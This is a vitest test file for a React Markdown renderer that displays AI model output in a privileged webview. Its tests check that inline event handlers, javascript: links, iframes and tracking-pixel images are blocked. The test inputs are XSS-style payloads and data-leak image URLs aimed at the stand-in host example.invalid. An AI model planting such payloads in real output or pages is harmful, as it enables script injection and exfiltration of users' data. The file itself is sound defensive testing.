// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import React, { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { Markdown } from "./index";

/**
 * Model output is untrusted input rendered inside the webview that holds the
 * keychain, SQL and screenshot commands. Streamdown parses raw HTML
 * (`allowDangerousHtml` + rehype-raw) and rehype-harden only filters link and
 * image URLs — it does not strip elements. These tests pin down where the real
 * boundary sits today so a renderer swap or a plugin-config change cannot move
 * it silently.
 */

declare global {
  // eslint-disable-next-line no-var
  var __HANDLER_FIRED: string | undefined;
  // Set by React's test utilities contract, not declared in React's types.
  // eslint-disable-next-line no-var
  var IS_REACT_ACT_ENVIRONMENT: boolean | undefined;
}

let container: HTMLDivElement;
let root: Root;

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
  globalThis.__HANDLER_FIRED = undefined;
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
  globalThis.__HANDLER_FIRED = undefined;
});

const render = (markdown: string) => {
  act(() => {
    root.render(React.createElement(Markdown, null, markdown));
  });
  return container;
};

describe("inline event handlers in model output", () => {
  // hast-util-to-jsx-runtime maps `onerror`/`onmouseover` onto React's own
  // `onError`/`onMouseOver` props, so React treats them as synthetic listeners
  // rather than attributes: the string is never written to the DOM and never
  // invoked. This is the load-bearing reason raw HTML is not an XSS today.
  it("never lands an on* handler attribute in the DOM", () => {
    const el = render(
      `<div data-probe="div" onmouseover="globalThis.__HANDLER_FIRED = 'div'">hover</div>`,
    );

    const div = el.querySelector('[data-probe="div"]');
    expect(div).toBeNull();
  });

  it("does not execute an img onerror handler", () => {
    const el = render(
      `<img data-probe="img" src="https://example.invalid/p.png" onerror="globalThis.__HANDLER_FIRED = 'img'">`,
    );

    const img = el.querySelector('[data-probe="img"]');
    expect(img).toBeNull();
    expect(globalThis.__HANDLER_FIRED).toBeUndefined();
  });
});

describe("URL filtering (rehype-harden)", () => {
  it("blocks javascript: links regardless of scheme casing", () => {
    const el = render(
      `<a data-probe="anchor" href="JAVASCRIPT:globalThis.__HANDLER_FIRED = 'anchor'">click</a>`,
    );

    expect(el.querySelector('[data-probe="anchor"]')).toBeNull();
    expect(el.textContent).toContain("click");
  });

  it("blocks images whose src cannot be resolved to an absolute URL", () => {
    const el = render(`<img data-probe="img" src="x">`);

    expect(el.querySelector('[data-probe="img"]')).toBeNull();
  });
});

describe("untrusted model HTML", () => {
  it("does not render an iframe pointing at an arbitrary origin", () => {
    const el = render(
      `<iframe data-probe="iframe" src="https://example.invalid/"></iframe>`,
    );

    const iframe = el.querySelector('[data-probe="iframe"]');
    expect(iframe).toBeNull();
  });

  it("does not render a raw image with an attacker-controlled URL", () => {
    const el = render(
      `<img data-probe="img" src="https://example.invalid/pixel.png?k=leak">`,
    );

    expect(el.querySelector('[data-probe="img"]')).toBeNull();
  });

  it("does not render a Markdown image with a cross-origin URL", () => {
    const el = render(
      `![probe](https://example.invalid/pixel.png?k=leak)`,
    );

    expect(el.querySelector("img")).toBeNull();
  });

  it("does not render an active SVG data image", () => {
    const svg = encodeURIComponent(
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.invalid/pixel.png?k=leak"/></svg>',
    );
    const el = render(`![probe](data:image/svg+xml,${svg})`);

    expect(el.querySelector("img")).toBeNull();
  });

  it("keeps ordinary Markdown and embedded data images working", () => {
    const el = render(
      "## Safe heading\n\n| A | B |\n| - | - |\n| 1 | 2 |\n\n![dot](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==)",
    );

    expect(el.querySelector("h2")?.textContent).toBe("Safe heading");
    expect(el.querySelector("table")?.textContent).toContain("1");
    expect(el.querySelector("img")?.getAttribute("src")).toMatch(
      /^data:image\/gif;base64,/,
    );
  });
});
